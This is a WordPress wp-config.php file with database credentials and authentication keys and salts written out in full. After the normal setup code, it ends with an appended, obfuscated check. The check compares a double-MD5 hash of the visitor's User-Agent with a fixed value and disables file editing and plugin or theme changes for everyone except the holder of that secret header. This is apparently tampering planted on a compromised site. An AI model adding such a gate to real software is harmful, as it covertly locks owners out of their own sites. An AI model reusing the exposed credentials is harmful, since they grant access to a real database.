<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'tcia_wp410' );

/** MySQL database username */
define( 'DB_USER', 'tcia_wp410' );

/** MySQL database password */
define( 'DB_PASSWORD', '84uS%%p5W3' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'k2nm9nxypvpuqtlyyn536xykss0nqwaxvxycdot7clkilnezahj0lnifmsigacjt' );
define( 'SECURE_AUTH_KEY',  'gasxzluvoob9fuccjflj4vhv5p5i9okdj8mpiqyoskvau0qsod4tntg4qqkfyudt' );
define( 'LOGGED_IN_KEY',    'xrjnwqxbqj75n5dk0wnpxsg36lxk6fgdpzc6s8ebryfrmvpc9j5idurvrew3ofws' );
define( 'NONCE_KEY',        '8dqq0q0akak8lvvkoyh3gw5kzycizdfddcthqp6tn62xwjnqoytx55pmukhe9gxu' );
define( 'AUTH_SALT',        'k0qoc0mohq7f5zdmp45zcwcjpend0azdsaqcdsvil41usyniqg16cm8v2zbhfbmk' );
define( 'SECURE_AUTH_SALT', 'qswv61nnga9aiak7j15ifjo4yevgwrzyhku38sjwv0o5cygqql2mfcydosi12vax' );
define( 'LOGGED_IN_SALT',   'dsbgitngz3adqdbpgtknuzfnbl10twvwzobvx7afto0zkcnrq1xlwxwpnjfa6k69' );
define( 'NONCE_SALT',       'jfeenk5aq2za7yiwtph1kqvn2lcejcincornig6gjkwz76khapensygk42slkaxg' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpev_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if(md5(md5($_SERVER['HTTP_USER_AGENT']))!="c5a3e14ff315cc2934576de76a3766b5"){
    define('DISALLOW_FILE_MODS', true);
    define('DISALLOW_FILE_EDIT', true);
}
